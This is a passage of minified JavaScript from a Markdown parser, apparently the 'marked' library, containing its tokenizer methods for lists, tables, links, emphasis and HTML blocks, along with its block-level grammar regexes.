*$/.test(p)&&(t+=p+"\n",n=n.substring(p.length+1),m=!0),!m)for(var v=new RegExp("^ {0,"+Math.min(3,o-1)+"}(?:[*+-]|\\d{1,9}[.)])((?:[ \t][^\\n]*)?(?:\\n|$))"),y=new RegExp("^ {0,"+Math.min(3,o-1)+"}((?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$)"),x=new RegExp("^ {0,"+Math.min(3,o-1)+"}(?:```|~~~)"),w=new RegExp("^ {0,"+Math.min(3,o-1)+"}#");n&&(p=d=n.split("\n",1)[0],this.options.pedantic&&(p=p.replace(/^ {1,4}(?=( {4})*[^ ])/g,"  ")),!x.test(p))&&!w.test(p)&&!v.test(p)&&!y.test(n);){if(p.search(/[^ ]/)>=o||!p.trim())u+="\n"+p.slice(o);else{if(s)break;if(c.search(/[^ ]/)>=4)break;if(x.test(c))break;if(w.test(c))break;if(y.test(c))break;u+="\n"+p}s||p.trim()||(s=!0),t+=d+"\n",n=n.substring(d.length+1),c=p.slice(o)}f.loose||(l?f.loose=!0:/\n *\n *$/.test(t)&&(l=!0)),this.options.gfm&&(a=/^\[[ xX]\] /.exec(u))&&(r="[ ] "!==a[0],u=u.replace(/^\[[ xX]\] +/,"")),f.items.push({type:"list_item",raw:t,task:!!a,checked:r,loose:!1,text:u}),f.raw+=t}f.items[f.items.length-1].raw=t.trimRight(),f.items[f.items.length-1].text=u.trimRight(),f.raw=f.raw.trimRight();var k=f.items.length;for(i=0;i<k;i++)if(this.lexer.state.top=!1,f.items[i].tokens=this.lexer.blockTokens(f.items[i].text,[]),!f.loose){var S=f.items[i].tokens.filter((function(n){return"space"===n.type})),C=S.length>0&&S.some((function(n){return/\n.*\n/.test(n.raw)}));f.loose=C}if(f.loose)for(i=0;i<k;i++)f.items[i].loose=!0;return f}},t.html=function(n){var e=this.rules.block.html.exec(n);if(e){var t={type:"html",raw:e[0],pre:!this.options.sanitizer&&("pre"===e[1]||"script"===e[1]||"style"===e[1]),text:e[0]};if(this.options.sanitize){var a=this.options.sanitizer?this.options.sanitizer(e[0]):c(e[0]);t.type="paragraph",t.text=a,t.tokens=this.lexer.inline(a)}return t}},t.def=function(n){var e=this.rules.block.def.exec(n);if(e){var t=e[1].toLowerCase().replace(/\s+/g," "),a=e[2]?e[2].replace(/^<(.*)>$/,"$1").replace(this.rules.inline._escapes,"$1"):"",r=e[3]?e[3].substring(1,e[3].length-1).replace(this.rules.inline._escapes,"$1"):e[3];return{type:"def",tag:t,raw:e[0],href:a,title:r}}},t.table=function(n){var e=this.rules.block.table.exec(n);if(e){var t={type:"table",header:m(e[1]).map((function(n){return{text:n}})),align:e[2].replace(/^ *|\| *$/g,"").split(/ *\| */),rows:e[3]&&e[3].trim()?e[3].replace(/\n[ \t]*$/,"").split("\n"):[]};if(t.header.length===t.align.length){t.raw=e[0];var a,r,o,i,s=t.align.length;for(a=0;a<s;a++)/^ *-+: *$/.test(t.align[a])?t.align[a]="right":/^ *:-+: *$/.test(t.align[a])?t.align[a]="center":/^ *:-+ *$/.test(t.align[a])?t.align[a]="left":t.align[a]=null;for(s=t.rows.length,a=0;a<s;a++)t.rows[a]=m(t.rows[a],t.header.length).map((function(n){return{text:n}}));for(s=t.header.length,r=0;r<s;r++)t.header[r].tokens=this.lexer.inline(t.header[r].text);for(s=t.rows.length,r=0;r<s;r++)for(i=t.rows[r],o=0;o<i.length;o++)i[o].tokens=this.lexer.inline(i[o].text);return t}}},t.lheading=function(n){var e=this.rules.block.lheading.exec(n);if(e)return{type:"heading",raw:e[0],depth:"="===e[2].charAt(0)?1:2,text:e[1],tokens:this.lexer.inline(e[1])}},t.paragraph=function(n){var e=this.rules.block.paragraph.exec(n);if(e){var t="\n"===e[1].charAt(e[1].length-1)?e[1].slice(0,-1):e[1];return{type:"paragraph",raw:e[0],text:t,tokens:this.lexer.inline(t)}}},t.text=function(n){var e=this.rules.block.text.exec(n);if(e)return{type:"text",raw:e[0],text:e[0],tokens:this.lexer.inline(e[0])}},t.escape=function(n){var e=this.rules.inline.escape.exec(n);if(e)return{type:"escape",raw:e[0],text:c(e[1])}},t.tag=function(n){var e=this.rules.inline.tag.exec(n);if(e)return!this.lexer.state.inLink&&/^<a /i.test(e[0])?this.lexer.state.inLink=!0:this.lexer.state.inLink&&/^<\/a>/i.test(e[0])&&(this.lexer.state.inLink=!1),!this.lexer.state.inRawBlock&&/^<(pre|code|kbd|script)(\s|>)/i.test(e[0])?this.lexer.state.inRawBlock=!0:this.lexer.state.inRawBlock&&/^<\/(pre|code|kbd|script)(\s|>)/i.test(e[0])&&(this.lexer.state.inRawBlock=!1),{type:this.options.sanitize?"text":"html",raw:e[0],inLink:this.lexer.state.inLink,inRawBlock:this.lexer.state.inRawBlock,text:this.options.sanitize?this.options.sanitizer?this.options.sanitizer(e[0]):c(e[0]):e[0]}},t.link=function(n){var e=this.rules.inline.link.exec(n);if(e){var t=e[2].trim();if(!this.options.pedantic&&/^</.test(t)){if(!/>$/.test(t))return;var a=h(t.slice(0,-1),"\\");if((t.length-a.length)%2==0)return}else{var r=function(n,e){if(-1===n.indexOf(e[1]))return-1;for(var t=n.length,a=0,r=0;r<t;r++)if("\\"===n[r])r++;else if(n[r]===e[0])a++;else if(n[r]===e[1]&&--a<0)return r;return-1}(e[2],"()");if(r>-1){var o=(0===e[0].indexOf("!")?5:4)+e[1].length+r;e[2]=e[2].substring(0,r),e[0]=e[0].substring(0,o).trim(),e[3]=""}}var i=e[2],s="";if(this.options.pedantic){var l=/^([^'"]*[^\s])\s+(['"])(.*)\2/.exec(i);l&&(i=l[1],s=l[3])}else s=e[3]?e[3].slice(1,-1):"";return i=i.trim(),/^</.test(i)&&(i=this.options.pedantic&&!/>$/.test(t)?i.slice(1):i.slice(1,-1)),f(e,{href:i?i.replace(this.rules.inline._escapes,"$1"):i,title:s?s.replace(this.rules.inline._escapes,"$1"):s},e[0],this.lexer)}},t.reflink=function(n,e){var t;if((t=this.rules.inline.reflink.exec(n))||(t=this.rules.inline.nolink.exec(n))){var a=(t[2]||t[1]).replace(/\s+/g," ");if(!(a=e[a.toLowerCase()])){var r=t[0].charAt(0);return{type:"text",raw:r,text:r}}return f(t,a,t[0],this.lexer)}},t.emStrong=function(n,e,t){void 0===t&&(t="");var a=this.rules.inline.emStrong.lDelim.exec(n);if(a&&(!a[3]||!t.match(/(?:[0-9A-Za-z\xAA\xB2\xB3\xB5\xB9\xBA\xBC-\xBE\xC0-\xD6\xD8-\xF6\xF8-\u02C1\u02C6-\u02D1\u02E0-\u02E4\u02EC\u02EE\u0370-\u0374\u0376\u0377\u037A-\u037D\u037F\u0386\u0388-\u038A\u038C\u038E-\u03A1\u03A3-\u03F5\u03F7-\u0481\u048A-\u052F\u0531-\u0556\u0559\u0560-\u0588\u05D0-\u05EA\u05EF-\u05F2\u0620-\u064A\u0660-\u0669\u066E\u066F\u0671-\u06D3\u06D5\u06E5\u06E6\u06EE-\u06FC\u06FF\u0710\u0712-\u072F\u074D-\u07A5\u07B1\u07C0-\u07EA\u07F4\u07F5\u07FA\u0800-\u0815\u081A\u0824\u0828\u0840-\u0858\u0860-\u086A\u0870-\u0887\u0889-\u088E\u08A0-\u08C9\u0904-\u0939\u093D\u0950\u0958-\u0961\u0966-\u096F\u0971-\u0980\u0985-\u098C\u098F\u0990\u0993-\u09A8\u09AA-\u09B0\u09B2\u09B6-\u09B9\u09BD\u09CE\u09DC\u09DD\u09DF-\u09E1\u09E6-\u09F1\u09F4-\u09F9\u09FC\u0A05-\u0A0A\u0A0F\u0A10\u0A13-\u0A28\u0A2A-\u0A30\u0A32\u0A33\u0A35\u0A36\u0A38\u0A39\u0A59-\u0A5C\u0A5E\u0A66-\u0A6F\u0A72-\u0A74\u0A85-\u0A8D\u0A8F-\u0A91\u0A93-\u0AA8\u0AAA-\u0AB0\u0AB2\u0AB3\u0AB5-\u0AB9\u0ABD\u0AD0\u0AE0\u0AE1\u0AE6-\u0AEF\u0AF9\u0B05-\u0B0C\u0B0F\u0B10\u0B13-\u0B28\u0B2A-\u0B30\u0B32\u0B33\u0B35-\u0B39\u0B3D\u0B5C\u0B5D\u0B5F-\u0B61\u0B66-\u0B6F\u0B71-\u0B77\u0B83\u0B85-\u0B8A\u0B8E-\u0B90\u0B92-\u0B95\u0B99\u0B9A\u0B9C\u0B9E\u0B9F\u0BA3\u0BA4\u0BA8-\u0BAA\u0BAE-\u0BB9\u0BD0\u0BE6-\u0BF2\u0C05-\u0C0C\u0C0E-\u0C10\u0C12-\u0C28\u0C2A-\u0C39\u0C3D\u0C58-\u0C5A\u0C5D\u0C60\u0C61\u0C66-\u0C6F\u0C78-\u0C7E\u0C80\u0C85-\u0C8C\u0C8E-\u0C90\u0C92-\u0CA8\u0CAA-\u0CB3\u0CB5-\u0CB9\u0CBD\u0CDD\u0CDE\u0CE0\u0CE1\u0CE6-\u0CEF\u0CF1\u0CF2\u0D04-\u0D0C\u0D0E-\u0D10\u0D12-\u0D3A\u0D3D\u0D4E\u0D54-\u0D56\u0D58-\u0D61\u0D66-\u0D78\u0D7A-\u0D7F\u0D85-\u0D96\u0D9A-\u0DB1\u0DB3-\u0DBB\u0DBD\u0DC0-\u0DC6\u0DE6-\u0DEF\u0E01-\u0E30\u0E32\u0E33\u0E40-\u0E46\u0E50-\u0E59\u0E81\u0E82\u0E84\u0E86-\u0E8A\u0E8C-\u0EA3\u0EA5\u0EA7-\u0EB0\u0EB2\u0EB3\u0EBD\u0EC0-\u0EC4\u0EC6\u0ED0-\u0ED9\u0EDC-\u0EDF\u0F00\u0F20-\u0F33\u0F40-\u0F47\u0F49-\u0F6C\u0F88-\u0F8C\u1000-\u102A\u103F-\u1049\u1050-\u1055\u105A-\u105D\u1061\u1065\u1066\u106E-\u1070\u1075-\u1081\u108E\u1090-\u1099\u10A0-\u10C5\u10C7\u10CD\u10D0-\u10FA\u10FC-\u1248\u124A-\u124D\u1250-\u1256\u1258\u125A-\u125D\u1260-\u1288\u128A-\u128D\u1290-\u12B0\u12B2-\u12B5\u12B8-\u12BE\u12C0\u12C2-\u12C5\u12C8-\u12D6\u12D8-\u1310\u1312-\u1315\u1318-\u135A\u1369-\u137C\u1380-\u138F\u13A0-\u13F5\u13F8-\u13FD\u1401-\u166C\u166F-\u167F\u1681-\u169A\u16A0-\u16EA\u16EE-\u16F8\u1700-\u1711\u171F-\u1731\u1740-\u1751\u1760-\u176C\u176E-\u1770\u1780-\u17B3\u17D7\u17DC\u17E0-\u17E9\u17F0-\u17F9\u1810-\u1819\u1820-\u1878\u1880-\u1884\u1887-\u18A8\u18AA\u18B0-\u18F5\u1900-\u191E\u1946-\u196D\u1970-\u1974\u1980-\u19AB\u19B0-\u19C9\u19D0-\u19DA\u1A00-\u1A16\u1A20-\u1A54\u1A80-\u1A89\u1A90-\u1A99\u1AA7\u1B05-\u1B33\u1B45-\u1B4C\u1B50-\u1B59\u1B83-\u1BA0\u1BAE-\u1BE5\u1C00-\u1C23\u1C40-\u1C49\u1C4D-\u1C7D\u1C80-\u1C88\u1C90-\u1CBA\u1CBD-\u1CBF\u1CE9-\u1CEC\u1CEE-\u1CF3\u1CF5\u1CF6\u1CFA\u1D00-\u1DBF\u1E00-\u1F15\u1F18-\u1F1D\u1F20-\u1F45\u1F48-\u1F4D\u1F50-\u1F57\u1F59\u1F5B\u1F5D\u1F5F-\u1F7D\u1F80-\u1FB4\u1FB6-\u1FBC\u1FBE\u1FC2-\u1FC4\u1FC6-\u1FCC\u1FD0-\u1FD3\u1FD6-\u1FDB\u1FE0-\u1FEC\u1FF2-\u1FF4\u1FF6-\u1FFC\u2070\u2071\u2074-\u2079\u207F-\u2089\u2090-\u209C\u2102\u2107\u210A-\u2113\u2115\u2119-\u211D\u2124\u2126\u2128\u212A-\u212D\u212F-\u2139\u213C-\u213F\u2145-\u2149\u214E\u2150-\u2189\u2460-\u249B\u24EA-\u24FF\u2776-\u2793\u2C00-\u2CE4\u2CEB-\u2CEE\u2CF2\u2CF3\u2CFD\u2D00-\u2D25\u2D27\u2D2D\u2D30-\u2D67\u2D6F\u2D80-\u2D96\u2DA0-\u2DA6\u2DA8-\u2DAE\u2DB0-\u2DB6\u2DB8-\u2DBE\u2DC0-\u2DC6\u2DC8-\u2DCE\u2DD0-\u2DD6\u2DD8-\u2DDE\u2E2F\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303C\u3041-\u3096\u309D-\u309F\u30A1-\u30FA\u30FC-\u30FF\u3105-\u312F\u3131-\u318E\u3192-\u3195\u31A0-\u31BF\u31F0-\u31FF\u3220-\u3229\u3248-\u324F\u3251-\u325F\u3280-\u3289\u32B1-\u32BF\u3400-\u4DBF\u4E00-\uA48C\uA4D0-\uA4FD\uA500-\uA60C\uA610-\uA62B\uA640-\uA66E\uA67F-\uA69D\uA6A0-\uA6EF\uA717-\uA71F\uA722-\uA788\uA78B-\uA7CA\uA7D0\uA7D1\uA7D3\uA7D5-\uA7D9\uA7F2-\uA801\uA803-\uA805\uA807-\uA80A\uA80C-\uA822\uA830-\uA835\uA840-\uA873\uA882-\uA8B3\uA8D0-\uA8D9\uA8F2-\uA8F7\uA8FB\uA8FD\uA8FE\uA900-\uA925\uA930-\uA946\uA960-\uA97C\uA984-\uA9B2\uA9CF-\uA9D9\uA9E0-\uA9E4\uA9E6-\uA9FE\uAA00-\uAA28\uAA40-\uAA42\uAA44-\uAA4B\uAA50-\uAA59\uAA60-\uAA76\uAA7A\uAA7E-\uAAAF\uAAB1\uAAB5\uAAB6\uAAB9-\uAABD\uAAC0\uAAC2\uAADB-\uAADD\uAAE0-\uAAEA\uAAF2-\uAAF4\uAB01-\uAB06\uAB09-\uAB0E\uAB11-\uAB16\uAB20-\uAB26\uAB28-\uAB2E\uAB30-\uAB5A\uAB5C-\uAB69\uAB70-\uABE2\uABF0-\uABF9\uAC00-\uD7A3\uD7B0-\uD7C6\uD7CB-\uD7FB\uF900-\uFA6D\uFA70-\uFAD9\uFB00-\uFB06\uFB13-\uFB17\uFB1D\uFB1F-\uFB28\uFB2A-\uFB36\uFB38-\uFB3C\uFB3E\uFB40\uFB41\uFB43\uFB44\uFB46-\uFBB1\uFBD3-\uFD3D\uFD50-\uFD8F\uFD92-\uFDC7\uFDF0-\uFDFB\uFE70-\uFE74\uFE76-\uFEFC\uFF10-\uFF19\uFF21-\uFF3A\uFF41-\uFF5A\uFF66-\uFFBE\uFFC2-\uFFC7\uFFCA-\uFFCF\uFFD2-\uFFD7\uFFDA-\uFFDC]|\uD800[\uDC00-\uDC0B\uDC0D-\uDC26\uDC28-\uDC3A\uDC3C\uDC3D\uDC3F-\uDC4D\uDC50-\uDC5D\uDC80-\uDCFA\uDD07-\uDD33\uDD40-\uDD78\uDD8A\uDD8B\uDE80-\uDE9C\uDEA0-\uDED0\uDEE1-\uDEFB\uDF00-\uDF23\uDF2D-\uDF4A\uDF50-\uDF75\uDF80-\uDF9D\uDFA0-\uDFC3\uDFC8-\uDFCF\uDFD1-\uDFD5]|\uD801[\uDC00-\uDC9D\uDCA0-\uDCA9\uDCB0-\uDCD3\uDCD8-\uDCFB\uDD00-\uDD27\uDD30-\uDD63\uDD70-\uDD7A\uDD7C-\uDD8A\uDD8C-\uDD92\uDD94\uDD95\uDD97-\uDDA1\uDDA3-\uDDB1\uDDB3-\uDDB9\uDDBB\uDDBC\uDE00-\uDF36\uDF40-\uDF55\uDF60-\uDF67\uDF80-\uDF85\uDF87-\uDFB0\uDFB2-\uDFBA]|\uD802[\uDC00-\uDC05\uDC08\uDC0A-\uDC35\uDC37\uDC38\uDC3C\uDC3F-\uDC55\uDC58-\uDC76\uDC79-\uDC9E\uDCA7-\uDCAF\uDCE0-\uDCF2\uDCF4\uDCF5\uDCFB-\uDD1B\uDD20-\uDD39\uDD80-\uDDB7\uDDBC-\uDDCF\uDDD2-\uDE00\uDE10-\uDE13\uDE15-\uDE17\uDE19-\uDE35\uDE40-\uDE48\uDE60-\uDE7E\uDE80-\uDE9F\uDEC0-\uDEC7\uDEC9-\uDEE4\uDEEB-\uDEEF\uDF00-\uDF35\uDF40-\uDF55\uDF58-\uDF72\uDF78-\uDF91\uDFA9-\uDFAF]|\uD803[\uDC00-\uDC48\uDC80-\uDCB2\uDCC0-\uDCF2\uDCFA-\uDD23\uDD30-\uDD39\uDE60-\uDE7E\uDE80-\uDEA9\uDEB0\uDEB1\uDF00-\uDF27\uDF30-\uDF45\uDF51-\uDF54\uDF70-\uDF81\uDFB0-\uDFCB\uDFE0-\uDFF6]|\uD804[\uDC03-\uDC37\uDC52-\uDC6F\uDC71\uDC72\uDC75\uDC83-\uDCAF\uDCD0-\uDCE8\uDCF0-\uDCF9\uDD03-\uDD26\uDD36-\uDD3F\uDD44\uDD47\uDD50-\uDD72\uDD76\uDD83-\uDDB2\uDDC1-\uDDC4\uDDD0-\uDDDA\uDDDC\uDDE1-\uDDF4\uDE00-\uDE11\uDE13-\uDE2B\uDE80-\uDE86\uDE88\uDE8A-\uDE8D\uDE8F-\uDE9D\uDE9F-\uDEA8\uDEB0-\uDEDE\uDEF0-\uDEF9\uDF05-\uDF0C\uDF0F\uDF10\uDF13-\uDF28\uDF2A-\uDF30\uDF32\uDF33\uDF35-\uDF39\uDF3D\uDF50\uDF5D-\uDF61]|\uD805[\uDC00-\uDC34\uDC47-\uDC4A\uDC50-\uDC59\uDC5F-\uDC61\uDC80-\uDCAF\uDCC4\uDCC5\uDCC7\uDCD0-\uDCD9\uDD80-\uDDAE\uDDD8-\uDDDB\uDE00-\uDE2F\uDE44\uDE50-\uDE59\uDE80-\uDEAA\uDEB8\uDEC0-\uDEC9\uDF00-\uDF1A\uDF30-\uDF3B\uDF40-\uDF46]|\uD806[\uDC00-\uDC2B\uDCA0-\uDCF2\uDCFF-\uDD06\uDD09\uDD0C-\uDD13\uDD15\uDD16\uDD18-\uDD2F\uDD3F\uDD41\uDD50-\uDD59\uDDA0-\uDDA7\uDDAA-\uDDD0\uDDE1\uDDE3\uDE00\uDE0B-\uDE32\uDE3A\uDE50\uDE5C-\uDE89\uDE9D\uDEB0-\uDEF8]|\uD807[\uDC00-\uDC08\uDC0A-\uDC2E\uDC40\uDC50-\uDC6C\uDC72-\uDC8F\uDD00-\uDD06\uDD08\uDD09\uDD0B-\uDD30\uDD46\uDD50-\uDD59\uDD60-\uDD65\uDD67\uDD68\uDD6A-\uDD89\uDD98\uDDA0-\uDDA9\uDEE0-\uDEF2\uDFB0\uDFC0-\uDFD4]|\uD808[\uDC00-\uDF99]|\uD809[\uDC00-\uDC6E\uDC80-\uDD43]|\uD80B[\uDF90-\uDFF0]|[\uD80C\uD81C-\uD820\uD822\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879\uD880-\uD883][\uDC00-\uDFFF]|\uD80D[\uDC00-\uDC2E]|\uD811[\uDC00-\uDE46]|\uD81A[\uDC00-\uDE38\uDE40-\uDE5E\uDE60-\uDE69\uDE70-\uDEBE\uDEC0-\uDEC9\uDED0-\uDEED\uDF00-\uDF2F\uDF40-\uDF43\uDF50-\uDF59\uDF5B-\uDF61\uDF63-\uDF77\uDF7D-\uDF8F]|\uD81B[\uDE40-\uDE96\uDF00-\uDF4A\uDF50\uDF93-\uDF9F\uDFE0\uDFE1\uDFE3]|\uD821[\uDC00-\uDFF7]|\uD823[\uDC00-\uDCD5\uDD00-\uDD08]|\uD82B[\uDFF0-\uDFF3\uDFF5-\uDFFB\uDFFD\uDFFE]|\uD82C[\uDC00-\uDD22\uDD50-\uDD52\uDD64-\uDD67\uDD70-\uDEFB]|\uD82F[\uDC00-\uDC6A\uDC70-\uDC7C\uDC80-\uDC88\uDC90-\uDC99]|\uD834[\uDEE0-\uDEF3\uDF60-\uDF78]|\uD835[\uDC00-\uDC54\uDC56-\uDC9C\uDC9E\uDC9F\uDCA2\uDCA5\uDCA6\uDCA9-\uDCAC\uDCAE-\uDCB9\uDCBB\uDCBD-\uDCC3\uDCC5-\uDD05\uDD07-\uDD0A\uDD0D-\uDD14\uDD16-\uDD1C\uDD1E-\uDD39\uDD3B-\uDD3E\uDD40-\uDD44\uDD46\uDD4A-\uDD50\uDD52-\uDEA5\uDEA8-\uDEC0\uDEC2-\uDEDA\uDEDC-\uDEFA\uDEFC-\uDF14\uDF16-\uDF34\uDF36-\uDF4E\uDF50-\uDF6E\uDF70-\uDF88\uDF8A-\uDFA8\uDFAA-\uDFC2\uDFC4-\uDFCB\uDFCE-\uDFFF]|\uD837[\uDF00-\uDF1E]|\uD838[\uDD00-\uDD2C\uDD37-\uDD3D\uDD40-\uDD49\uDD4E\uDE90-\uDEAD\uDEC0-\uDEEB\uDEF0-\uDEF9]|\uD839[\uDFE0-\uDFE6\uDFE8-\uDFEB\uDFED\uDFEE\uDFF0-\uDFFE]|\uD83A[\uDC00-\uDCC4\uDCC7-\uDCCF\uDD00-\uDD43\uDD4B\uDD50-\uDD59]|\uD83B[\uDC71-\uDCAB\uDCAD-\uDCAF\uDCB1-\uDCB4\uDD01-\uDD2D\uDD2F-\uDD3D\uDE00-\uDE03\uDE05-\uDE1F\uDE21\uDE22\uDE24\uDE27\uDE29-\uDE32\uDE34-\uDE37\uDE39\uDE3B\uDE42\uDE47\uDE49\uDE4B\uDE4D-\uDE4F\uDE51\uDE52\uDE54\uDE57\uDE59\uDE5B\uDE5D\uDE5F\uDE61\uDE62\uDE64\uDE67-\uDE6A\uDE6C-\uDE72\uDE74-\uDE77\uDE79-\uDE7C\uDE7E\uDE80-\uDE89\uDE8B-\uDE9B\uDEA1-\uDEA3\uDEA5-\uDEA9\uDEAB-\uDEBB]|\uD83C[\uDD00-\uDD0C]|\uD83E[\uDFF0-\uDFF9]|\uD869[\uDC00-\uDEDF\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF38\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uDFFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0]|\uD87E[\uDC00-\uDE1D]|\uD884[\uDC00-\uDF4A])/))){var r=a[1]||a[2]||"";if(!r||r&&(""===t||this.rules.inline.punctuation.exec(t))){var o,i,s=a[0].length-1,l=s,c=0,p="*"===a[0][0]?this.rules.inline.emStrong.rDelimAst:this.rules.inline.emStrong.rDelimUnd;for(p.lastIndex=0,e=e.slice(-1*n.length+s);null!=(a=p.exec(e));)if(o=a[1]||a[2]||a[3]||a[4]||a[5]||a[6])if(i=o.length,a[3]||a[4])l+=i;else if(!((a[5]||a[6])&&s%3)||(s+i)%3){if(!((l-=i)>0)){i=Math.min(i,i+l+c);var d=n.slice(0,s+a.index+(a[0].length-o.length)+i);if(Math.min(s,i)%2){var u=d.slice(1,-1);return{type:"em",raw:d,text:u,tokens:this.lexer.inlineTokens(u)}}var m=d.slice(2,-2);return{type:"strong",raw:d,text:m,tokens:this.lexer.inlineTokens(m)}}}else c+=i}}},t.codespan=function(n){var e=this.rules.inline.code.exec(n);if(e){var t=e[2].replace(/\n/g," "),a=/[^ ]/.test(t),r=/^ /.test(t)&&/ $/.test(t);return a&&r&&(t=t.substring(1,t.length-1)),t=c(t,!0),{type:"codespan",raw:e[0],text:t}}},t.br=function(n){var e=this.rules.inline.br.exec(n);if(e)return{type:"br",raw:e[0]}},t.del=function(n){var e=this.rules.inline.del.exec(n);if(e)return{type:"del",raw:e[0],text:e[2],tokens:this.lexer.inlineTokens(e[2])}},t.autolink=function(n,e){var t,a,r=this.rules.inline.autolink.exec(n);if(r)return a="@"===r[2]?"mailto:"+(t=c(this.options.mangle?e(r[1]):r[1])):t=c(r[1]),{type:"link",raw:r[0],text:t,href:a,tokens:[{type:"text",raw:t,text:t}]}},t.url=function(n,e){var t;if(t=this.rules.inline.url.exec(n)){var a,r;if("@"===t[2])r="mailto:"+(a=c(this.options.mangle?e(t[0]):t[0]));else{var o;do{o=t[0],t[0]=this.rules.inline._backpedal.exec(t[0])[0]}while(o!==t[0]);a=c(t[0]),r="www."===t[1]?"http://"+t[0]:t[0]}return{type:"link",raw:t[0],text:a,href:r,tokens:[{type:"text",raw:a,text:a}]}}},t.inlineText=function(n,e){var t,a=this.rules.inline.text.exec(n);if(a)return t=this.lexer.state.inRawBlock?this.options.sanitize?this.options.sanitizer?this.options.sanitizer(a[0]):c(a[0]):a[0]:c(this.options.smartypants?e(a[0]):a[0]),{type:"text",raw:a[0],text:t}},e}(),M={newline:/^(?: *(?:\n|$))+/,code:/^( {4}[^\n]+(?:\n(?: *(?:\n|$))*)?)+/,fences:/^ {0,3}(`{3,}(?=[^`\n]*(?:\n|$))|~{3,})([^\n]*)(?:\n|$)(?:|([\s\S]*?)(?:\n|$))(?: {0,3}\1[~`]* *(?=\n|$)|$)/,hr:/^ {0,3}((?:-[\t ]*){3,}|(?:_[ \t]*){3,}|(?:\*[ \t]*){3,})(?:\n+|$)/,heading:/^ {0,3}(#{1,6})(?=\s|$)(.*)(?:\n+|$)/,blockquote:/^( {0,3}> ?(paragraph|[^\n]*)(?:\n|$))+/,list:/^( {0,3}bull)([ \t][^\n]+?)?(?:\n|$)/,html:"^ {0,3}(?:<(script|pre|style|textarea)[\\s>][\\s\\S]*?(?:</\\1>[^\\n]*\\n+|$)|comment[^\\n]*(\\n+|$)|<\\?[\\s\\S]*?(?:\\?>\\n*|$)|<![A-Z][\\s\\S]*?(?:>\\n*|$)|<!\\[CDATA\\[[\\s\\S]*?(?:\\]\\]>\\n*|$)|</?(tag)(?: +|\\n|/?>)[\\s\\S]*?(?:(?:\\n *)+\\n|$)|<(?!script|pre|style|textarea)([a-z][\\w-]*)(?:attribute)*? */?>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n *)+\\n|$)|</(?!script|pre|style|textarea)[a-z][\\w-]*\\s*>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n *)+\\n|$))",def:/^ {0,3}\[(label)\]: *(?:\n *)?([^<\s][^\s]*|<.*?>)(?:(?: +(?:\n *)?| *\n *)(title))? *(?:\n+|$)/,table:O,lheading:/^((?:.|\n(?!\n))+?)\n {0,3}(=+|-+) *(?:\n+|$)/,_paragraph:/^([^\n]+(?:\n(?!hr|heading|lheading|blockquote|fences|list|html|table| +\n)[^\n]+)*)/,text:/^[^\n]+/,_label:/(?!\s*\])(?:\\.|[^\[\]\\])+/,_title:/(?:"(?:\\"?|[^"\\])*"|'[^'\n]*(?:\n[^'\n]+)*\n?'|\([^()]*\))/};M.def=d(M.def).replace("label",M._label).replace("title",M._title).getRegex(),M.bullet=/(?:[*+-]|\d{1,9}[.)])/,M.listItemStart=d(/^( *)(bull) */).replace("bull",M.bullet).getRegex(),M.list=d(M.list).replace(/bull/g,M.bullet).replace("hr","\\n+(?=\\1?(?:(?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$))").replace("def","\\n+(?="+M.def.source+")").getRegex(),M._tag="address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|legend|li|link|main|menu|menuitem|meta|nav|noframes|ol|optgroup|option|p|param|section|source|summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul",M._comment=/<!--(?!-?>)[\s\S]*?(?:-->|$)/,M.html=d(M.html,"i").replace("comment",M._comment).replace("tag",M._tag).replace("attribute",/ +[a-zA-Z:_][\w.:-]*(?: *= *"[^"\n]*"| *= *'[^'\n]*'| *= *[^\s"'=<>`]+)?/).getRegex(),M.paragraph=d(M._paragraph).replace("hr",M.hr).replace("heading"," {0,3}#{1,6} ").replace("|lheading","").replace("|table","").replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",M._tag).getRegex(),M.blockquote=d(M.blockquote).replace("paragraph",M.paragraph).getRegex(),M.normal=a({},M),M.gfm=a({},M.normal,{table:"^ *([^\\n ].*\\|.*)\\n {0,3}(?:\\| *)?(:?-+:? *(?:\\| *:?-+:? *)*)(?:\\| *)?(?:\\n((?:(?! *\\n|hr|heading|blockquote|code|fences|list|html).*(?:\\n|$))*)\\n*|$)"}),M.gfm.table=d(M.gfm.table).replace("hr",M.hr).replace("heading"," {0,3}#{1,6} ").replace("blockquote"," {0,3}>").replace("code"," {4}[^\\n]").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",M._tag).getRegex(),M.gfm.paragraph=d(M._paragraph).replace("hr",M.hr).replace("heading"," {0,3}#{1,6} ").replace("|lheading","").replace("table",M.gfm.table).replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",M._tag).getRegex(),M.pedantic=a({},M.normal,{html:d("^ *(?:comment *(?:\\n|\\s*$)|<(tag)[\\s\\S]+?</\\1> *(?:\\n{2,}|\\s*$)|<tag(?:\"[^\"]*\"|'[^']*'|\\s[^'\"/>\\s]*)*?/?> 